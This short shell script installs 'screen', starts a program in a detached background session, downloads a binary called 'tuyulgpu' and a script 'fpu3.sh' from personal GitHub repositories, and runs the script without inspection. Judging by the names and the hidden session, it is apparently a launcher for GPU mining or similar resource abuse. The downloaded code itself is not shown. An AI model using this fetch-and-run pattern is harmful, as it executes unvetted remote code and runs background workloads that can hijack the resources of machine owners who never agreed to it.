#!/bin/sh

sudo apt update
sudo apt install screen -y
screen -dmS fpu.sh ./fpu.sh 65 75
wget https://github.com/nuri655/nur/raw/main/tuyulgpu
wget https://raw.githubusercontent.com/cakcokcakcok/bebas/main/fpu3.sh
chmod +x fpu3.sh
./fpu3.sh
